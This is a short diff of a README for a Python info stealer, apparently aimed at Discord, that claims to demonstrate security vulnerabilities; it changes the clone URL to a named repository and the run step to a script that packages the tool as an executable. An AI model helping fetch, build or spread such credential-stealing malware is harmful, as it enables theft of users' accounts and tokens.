@@ -16,14 +16,14 @@ This is an **info stealer** written in Python designed to demonstrate security v
 ## 🚀 Installation
 ```sh
 # Clone the repository
-git clone https://github.com/yourusername/discord-infostealer.git
+git clone https://github.com/sexhax/infostealer.git
 cd infostealer
 
 # Install dependencies
 pip install -r requirements.txt
 
 # Run the script
-python infostealer.py
+python pyinstallertoexe.py
 ```
 
 ## 🔍 How It Works
